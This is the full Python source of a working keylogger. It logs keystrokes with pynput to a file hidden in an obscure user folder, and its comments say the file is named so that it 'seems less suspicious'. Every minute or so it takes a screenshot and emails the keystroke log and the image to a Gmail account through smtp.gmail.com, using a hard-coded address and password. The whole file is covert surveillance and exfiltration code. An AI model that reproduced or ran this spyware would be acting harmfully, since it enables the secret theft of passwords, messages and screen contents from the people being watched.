import time
from pynput import keyboard
import logging
import pyscreenshot
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

global current_time
global iteration_time
iteration_time = time.time() + 60
""""Create a log file in Difficult directory where user may never visit"""
loging_directory = r'C:\Users\Hashar Mujahid\3D Objects\ '
"""Set loging configurations and also chnge the name of the file.txt to some common name so it seems less suspicious """
logging.basicConfig(filename=loging_directory + 'untitled.txt', level=logging.DEBUG, format='%(asctime)s : %(message)s')
'''Now create a function to store the key presses in the log file'''

"""ADD Sending Email functionality"""
email = 'pythong988@gmail.com'
to_email = 'pythong988@gmail.com'
password = '%x%B9oqf2v$44&2'
file_path = r'C:\Users\Hashar Mujahid\3D Objects\ '


def send_email(file_name, attachment, to_address):
    from_address = email
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = 'Log file'
    body = 'Key_logger_data_collection'
    msg.attach(MIMEText(body, 'plain'))
    file_name = file_name
    attachment = open(attachment, 'rb')
    b = MIMEBase('application', 'octet-streams')
    b.set_payload((attachment).read())
    encoders.encode_base64(b)
    b.add_header('content-disposition', 'attachment; filename= %s' % file_name)
    msg.attach(b)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


"""Now scadule the function of sending email after every 2 min"""


def screenshoot():
    img = pyscreenshot.grab()
    img.save(loging_directory + 'img.png')


def on_press(key):
    global current_time
    global iteration_time
    current_time = time.time()
    if current_time < iteration_time:
        logging.info(str(key))
        print(current_time)
        print('targte', iteration_time)

    else:

        screenshoot()
        send_email(file_name='untitled.txt', attachment=file_path + 'untitled.txt', to_address=to_email)
        send_email(file_name='img.png', attachment=file_path + 'img.png', to_address=to_email)
        print('success')

        with open(file_path + 'untitled.txt', 'w') as log:
            log.write(' ')
            log.close()
        current_time=time.time()
        iteration_time=time.time()+60

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
